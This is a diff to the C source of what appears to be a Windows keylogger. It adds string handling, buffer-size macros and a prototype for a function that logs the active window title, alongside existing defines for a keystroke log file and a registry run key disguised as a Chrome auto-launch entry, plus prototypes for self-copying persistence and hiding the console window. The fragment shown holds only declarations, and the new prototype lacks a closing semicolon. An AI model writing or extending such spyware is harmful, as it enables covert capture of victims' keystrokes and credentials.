@@ -7,6 +7,7 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <direct.h>
+#include <string.h>
 
 /* Defines */
 #define LOGFILE "log.txt"
@@ -15,11 +16,11 @@
 #define REGISTERY_NAME "ChromeAutoLaunch_9A8B7C6D12E4F9A27B3A7F5C4D9A6B8F2"
 #define KEY_PRESSED 0x8000
 #define CAPSLOCK_MASK 0x0001
-
-// New macros for key scanning boundaries and sleep interval
 #define KEY_CODE_MIN 8
 #define KEY_CODE_MAX 256
 #define SLEEP_INTERVAL_MS 10
+#define WINDOW_TITLE_BUFFER_SIZE 256
+#define TITLE_LOG_BUFFER_SIZE 300
 
 /* function prototypes */
 /**
@@ -84,6 +85,13 @@ void setRegistryPersistence(const char *targetPath);
  * Performs the persistence operations: copying the file and setting registry.
  */
 void persistence();
+
+/**
+ * Updates the log file with the current active window title.
+ *
+ * @note Uses a static variable to remember the last active window title.
+ */
+ void updateWindowTitle()
 
 /**
  * Hides the console window.
